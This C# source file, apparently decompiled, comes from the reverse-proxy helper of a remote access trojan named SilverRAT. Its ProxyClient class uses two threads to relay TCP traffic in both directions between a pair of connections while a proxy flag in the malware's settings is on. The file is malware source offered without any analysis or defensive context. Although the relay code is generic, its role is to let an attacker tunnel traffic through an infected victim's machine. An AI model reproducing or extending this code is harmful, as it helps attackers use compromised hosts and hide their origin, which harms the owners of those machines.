using System.Net.Sockets;
using System.Threading;

namespace SilverRAT.Helper.ReverseProxy;

internal class ProxyClient
{
    private TcpClient TcpClient_0 { get; set; }

    private TcpClient TcpClient_1 { get; set; }

    private NetworkStream NetworkStream_0 { get; set; }

    private NetworkStream NetworkStream_1 { get; set; }

    public void NetworkStream(TcpClient tcpClient_2, TcpClient tcpClient_3)
    {
        TcpClient_0 = tcpClient_2;
        TcpClient_1 = tcpClient_3;
        NetworkStream_0 = tcpClient_2.GetStream();
        NetworkStream_1 = tcpClient_3.GetStream();
        new Thread(Reverse).Start();
        new Thread(Send).Start();
    }

    private void Reverse()
    {
        try
        {
            byte[] array = new byte[24577];
            while (true)
            {
                if (Settings.IsConnectedProxy)
                {
                    int num = NetworkStream_0.Read(array, 0, array.Length);
                    if (num == 0)
                    {
                        break;
                    }
                    NetworkStream_1.Write(array, 0, num);
                    NetworkStream_1.Flush();
                    continue;
                }
                return;
            }
            NetworkStream_0.Close();
            TcpClient_0.Close();
            TcpClient_1.Close();
            NetworkStream_1.Close();
        }
        catch
        {
            TcpClient_0.Close();
            TcpClient_1.Close();
        }
    }

    private void Send()
    {
        try
        {
            byte[] array = new byte[24577];
            while (true)
            {
                if (Settings.IsConnectedProxy)
                {
                    int num = NetworkStream_1.Read(array, 0, array.Length);
                    if (num == 0)
                    {
                        break;
                    }
                    NetworkStream_0.Write(array, 0, num);
                    NetworkStream_0.Flush();
                    continue;
                }
                return;
            }
            NetworkStream_0.Close();
            TcpClient_0.Close();
            TcpClient_1.Close();
            NetworkStream_1.Close();
        }
        catch
        {
            TcpClient_0.Close();
            TcpClient_1.Close();
        }
    }
}
